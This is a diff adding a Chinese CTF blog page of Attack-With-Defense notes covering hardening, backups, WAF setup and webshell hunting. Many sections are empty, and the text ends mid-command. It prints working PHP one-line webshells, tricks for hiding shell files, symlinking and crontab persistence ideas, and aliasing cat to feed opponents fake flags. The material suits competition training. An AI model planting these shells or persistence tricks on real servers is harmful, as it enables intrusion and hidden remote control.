@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>AWD Basic and Scripts | Lunatic&#39;s Workstation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="AWD Basic">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWD Basic and Scripts">
+<meta property="og:url" content="https://goodlunatic.github.io/2023/11/17/AWD%20Basic%20and%20Scripts/index.html">
+<meta property="og:site_name" content="Lunatic&#39;s Workstation">
+<meta property="og:description" content="AWD Basic">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-11-17T01:50:15.000Z">
+<meta property="article:modified_time" content="2023-11-17T02:38:59.745Z">
+<meta property="article:author" content="Lunatic">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="AWD">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Lunatic&#39;s Workstation" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Lunatic&#39;s Workstation</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+          <a class="main-nav-link" href="/Friends">Friends</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://goodlunatic.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-AWD Basic and Scripts" class="article article-type-post" itemscope
+  itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/17/AWD%20Basic%20and%20Scripts/" class="article-date">
+  <time datetime="2023-11-17T01:50:15.000Z" itemprop="datePublished">2023-11-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      AWD Basic and Scripts
+    </h1>
+  
+
+    </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      <div class="toc-parent">
+  <div id="toc" class="toc-article">
+    <div class="toc-title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-text">做题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4SSH%E5%AF%86%E7%A0%81%E3%80%81%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="toc-text">修改默认SSH密码、网站后台管理员密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B9%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E6%9C%AC%E5%9C%B0"><span class="toc-text">备份网站源码和数据库并下载到本地</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8D%E7%9B%BE%E3%80%81Seay%E3%80%81Rips%E8%BF%9B%E8%A1%8C%E6%9F%A5%E6%9D%80"><span class="toc-text">用D盾、Seay、Rips进行查杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E5%AE%8C%E5%90%8E%E5%8E%8B%E7%BC%A9%E5%B9%B6%E4%B8%8A%E4%BC%A0%E5%88%B0html%E7%9B%AE%E5%BD%95%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%8E%8B"><span class="toc-text">查杀完后压缩并上传到html目录进行解压</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%AD%A3%E5%B8%B8%E5%90%8E%E4%B8%8AWaf"><span class="toc-text">网站正常后上Waf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#watchbird"><span class="toc-text">watchbird</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#own-waf"><span class="toc-text">own_waf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E8%BF%9E%E6%8E%A5AntSword%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-text">批量连接AntSword进行权限维持</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A0%E5%9B%BA%E9%98%B6%E6%AE%B5"><span class="toc-text">加固阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-text">修改密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%A4%87%E4%BB%BD"><span class="toc-text">代码备份</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E7%BD%91%E7%AB%99"><span class="toc-text">备份网站</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD"><span class="toc-text">数据备份</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E9%80%9A%E9%98%B2%E8%84%9A%E6%9C%AC"><span class="toc-text">上通防脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-text">漏洞发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#D%E7%9B%BE%E6%89%AB%E6%8F%8F%E6%88%96%E8%80%85Rips%E6%89%AB%E6%8F%8F"><span class="toc-text">D盾扫描或者Rips扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-text">反编译</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%88%99"><span class="toc-text">基本原则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E5%B7%A7"><span class="toc-text">技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E5%A4%84%E7%90%86"><span class="toc-text">正则处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">代码执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E4%B8%A5"><span class="toc-text">调用函数过滤不严</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E9%99%90%E5%88%B6"><span class="toc-text">代码限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%99%90%E5%88%B6"><span class="toc-text">环境限制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">Java反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95%E6%A0%A1%E9%AA%8C%E6%9C%BA%E5%88%B6"><span class="toc-text">类的白名单校验机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6JVM%E6%89%A7%E8%A1%8C%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">进制JVM执行外部命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8Fshell"><span class="toc-text">隐藏shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84shell"><span class="toc-text">特殊的shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B4%BB-amp-%E6%89%B9%E9%87%8F%E6%8F%90%E4%BA%A4flag"><span class="toc-text">探活&amp;批量提交flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crontab%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-text">crontab定时任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%BD%AF%E8%BF%9E%E6%8E%A5"><span class="toc-text">使用软连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%9F%A5%E6%9D%80"><span class="toc-text">基础查杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%80%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-text">杀不死马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">清除反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-text">日志分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%B2%E6%89%B0%E5%AF%B9%E6%89%8B"><span class="toc-text">干扰对手</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell%E5%8F%98%E8%BF%81%E5%8F%B2"><span class="toc-text">webshell变迁史</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E9%A9%AC"><span class="toc-text">大马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E9%A9%AC"><span class="toc-text">小马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-1"><span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-text">php不死马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">python内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">一些绕过方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">java内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-web%E7%9A%84%E4%B8%89%E5%A4%A7%E7%BB%84%E4%BB%B6"><span class="toc-text">Java web的三大组件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%8D%E6%9D%80"><span class="toc-text">免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E5%9C%A8%E7%BA%BF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0"><span class="toc-text">免杀在线检测平台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-webshell%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF"><span class="toc-text">php webshell免杀思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CMS%E5%AE%A1%E8%AE%A1"><span class="toc-text">CMS审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#wordpress"><span class="toc-text">wordpress</span></a></li></ol></li></ol>
+  </div>
+</div>
+      <p><strong>AWD Basic</strong></p>
+<span id="more"></span>
+
+<h1 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h1><h2 id="修改默认SSH密码、网站后台管理员密码"><a href="#修改默认SSH密码、网站后台管理员密码" class="headerlink" title="修改默认SSH密码、网站后台管理员密码"></a>修改默认SSH密码、网站后台管理员密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd team1</span><br><span class="line"><span class="comment">#a1natas@123456</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="备份网站源码和数据库并下载到本地"><a href="#备份网站源码和数据库并下载到本地" class="headerlink" title="备份网站源码和数据库并下载到本地"></a>备份网站源码和数据库并下载到本地</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www &amp;&amp; tar -czvf /tmp/bak.tar.gz html</span><br></pre></td></tr></table></figure>
+
+<h2 id="用D盾、Seay、Rips进行查杀"><a href="#用D盾、Seay、Rips进行查杀" class="headerlink" title="用D盾、Seay、Rips进行查杀"></a>用D盾、Seay、Rips进行查杀</h2><h2 id="查杀完后压缩并上传到html目录进行解压"><a href="#查杀完后压缩并上传到html目录进行解压" class="headerlink" title="查杀完后压缩并上传到html目录进行解压"></a>查杀完后压缩并上传到html目录进行解压</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf src.tar.gz html</span><br><span class="line">tar -zxvf src.tar.gz -C html</span><br></pre></td></tr></table></figure>
+
+<h2 id="网站正常后上Waf"><a href="#网站正常后上Waf" class="headerlink" title="网站正常后上Waf"></a>网站正常后上Waf</h2><h3 id="watchbird"><a href="#watchbird" class="headerlink" title="watchbird"></a>watchbird</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将waf.so,watchbird.php文件存放在/var/www/html或其他目录中</span><br><span class="line">php watchbird.php --install /var/www/html</span><br><span class="line">删除watchbird用以下命令,可以多删除几次</span><br><span class="line">php watchbird.php --uninstall /var/www/html</span><br></pre></td></tr></table></figure>
+
+<h3 id="own-waf"><a href="#own-waf" class="headerlink" title="own_waf"></a>own_waf</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接在每个php文件头部include即可，include_once是只包含一次，若已包含就不包含，include是每次访问都包含</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include_once</span> <span class="string">&#x27;faw.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include_once</span> <span class="string">&#x27;/faw.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include_once</span> <span class="string">&#x27;/var/www/html/faw.php&#x27;</span>; <span class="meta">?&gt;</span>	</span><br></pre></td></tr></table></figure>
+
+<h2 id="批量连接AntSword进行权限维持"><a href="#批量连接AntSword进行权限维持" class="headerlink" title="批量连接AntSword进行权限维持"></a>批量连接AntSword进行权限维持</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="加固阶段"><a href="#加固阶段" class="headerlink" title="加固阶段"></a>加固阶段</h1><h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd password</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码备份"><a href="#代码备份" class="headerlink" title="代码备份"></a>代码备份</h2><h3 id="备份网站"><a href="#备份网站" class="headerlink" title="备份网站"></a>备份网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打包的命令</span></span><br><span class="line"><span class="built_in">cd</span> /var/www &amp;&amp; tar -czvf /tmp/bak.tar.gz html</span><br><span class="line"><span class="built_in">cd</span> / &amp;&amp; tar -czvf /tmp/app.bak app</span><br><span class="line">zip -q -r html.zip /home/html</span><br><span class="line"><span class="comment"># 解包的命令</span></span><br><span class="line">tar -zxvf bak.tar.gz -C /var/www/html</span><br><span class="line">unzip -d /tmp/ app.zip</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -proot --databases DB1 DB2 &gt;/tmp/db.sql</span><br><span class="line">无lock tables权限的解决方法</span><br><span class="line">mysql dump -uroot -proot --al l-databases --skip-lock-tables &gt;/tmp/db.sql</span><br><span class="line">恢复备份（在MySQL终端下执行)</span><br><span class="line"><span class="built_in">source</span> FILE PATH</span><br></pre></td></tr></table></figure>
+
+<h2 id="上通防脚本"><a href="#上通防脚本" class="headerlink" title="上通防脚本"></a>上通防脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将waf.so,watchbird.php文件存放在/var/www/html或其他目录中</span><br><span class="line">将watchbird.php放在www-data可读的目录, 确保当前用户对目标目录可写,</span><br><span class="line">然后执行php watchbird.php --install [Web目录], 安装器将会输出安装了watchbird的文件路径</span><br><span class="line">访问任意启用了waf的文件, 参数?watchbird=ui打开watchbird控制台, 创建一个初始密码</span><br><span class="line">如需卸载, 请在相同的位置输入php watchbird.php --uninstall [Web目录], 如果您多次运行了安装, 请多次运行卸载直到卸载器无输出</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h2 id="D盾扫描或者Rips扫描"><a href="#D盾扫描或者Rips扫描" class="headerlink" title="D盾扫描或者Rips扫描"></a>D盾扫描或者Rips扫描</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通用框架——版本识别，找到对应漏洞</span><br><span class="line">自研网站——找入口、找关键词、查逻辑</span><br></pre></td></tr></table></figure>
+
+<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IDEA、jd-gui、IDA</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h2 id="基本原则"><a href="#基本原则" class="headerlink" title="基本原则"></a>基本原则</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">能修复的尽量修复</span><br><span class="line">不能修复的先注释源码，不影响页面显示再删除</span><br><span class="line">站点和对应的功能尽可能不down机</span><br><span class="line">后门文件直接删除</span><br></pre></td></tr></table></figure>
+
+<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设置waf，如load_file</span><br><span class="line">对于一些成型的CMS，找到相应的版本号后，对其diff</span><br><span class="line">修改弱口令用户</span><br><span class="line">对于危险函数直接die()</span><br><span class="line">include日志记录代码，便于后续定位漏洞并复现打别的主机</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="正则处理"><a href="#正则处理" class="headerlink" title="正则处理"></a>正则处理</h3><h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><h3 id="调用函数过滤不严"><a href="#调用函数过滤不严" class="headerlink" title="调用函数过滤不严"></a>调用函数过滤不严</h3><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="代码限制"><a href="#代码限制" class="headerlink" title="代码限制"></a>代码限制</h3><h3 id="环境限制"><a href="#环境限制" class="headerlink" title="环境限制"></a>环境限制</h3><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><h3 id="类的白名单校验机制"><a href="#类的白名单校验机制" class="headerlink" title="类的白名单校验机制"></a>类的白名单校验机制</h3><h3 id="进制JVM执行外部命令"><a href="#进制JVM执行外部命令" class="headerlink" title="进制JVM执行外部命令"></a>进制JVM执行外部命令</h3><h1 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[pass]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>asp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>aspx</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="隐藏shell"><a href="#隐藏shell" class="headerlink" title="隐藏shell"></a>隐藏shell</h2><p>1、把shell.php命名为.shell.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.shell.php在执行ls时无法被查看到</span><br></pre></td></tr></table></figure>
+
+<p>2、把shell.php命名为-shell.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm的时候，-shell.php会被当成参数，就会报错导致无法删除</span><br><span class="line">但是可以使用rm -rf ./-shell.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="特殊的shell"><a href="#特殊的shell" class="headerlink" title="特殊的shell"></a>特殊的shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="number">2</span>]).@<span class="variable">$_</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="探活-amp-批量提交flag"><a href="#探活-amp-批量提交flag" class="headerlink" title="探活&amp;批量提交flag"></a>探活&amp;批量提交flag</h2><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="crontab定时任务"><a href="#crontab定时任务" class="headerlink" title="crontab定时任务"></a>crontab定时任务</h3><p>1、使用定时任务写马</p>
+<p>2、使用定时任务发送带有flag的请求</p>
+<p>3、使用定时任务反弹shell</p>
+<h3 id="使用软连接"><a href="#使用软连接" class="headerlink" title="使用软连接"></a>使用软连接</h3><p>软连接语法：ln -s [shell路径] [新文件路径]</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /var/www/html/upload/shell.php /var/www/html/upload/new.php</span><br><span class="line"><span class="built_in">ln</span> -s /flag /var/www/html/css/flag.css</span><br></pre></td></tr></table></figure>
+
+<h2 id="基础查杀"><a href="#基础查杀" class="headerlink" title="基础查杀"></a>基础查杀</h2><p>寻找最近20min内修改过的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name *.php -mmin -20</span><br></pre></td></tr></table></figure>
+
+<p>寻找行数最短的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="built_in">wc</span> -l | <span class="built_in">sort</span> -u</span><br></pre></td></tr></table></figure>
+
+<p>关键字查杀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &#x27;*.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>alias起别名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> <span class="built_in">cat</span>=<span class="string">&quot;echo nothing&#x27;</span></span><br><span class="line"><span class="string">#删除所有别名</span></span><br><span class="line"><span class="string">unalias -a</span></span><br><span class="line"><span class="string">#对方执行cat/flag命令的时候回显就是错误fIag</span></span><br><span class="line"><span class="string">alias cat=&quot;</span><span class="built_in">echo</span> `<span class="built_in">date</span>`|<span class="built_in">md5sum</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;&#x27;</span>-f1<span 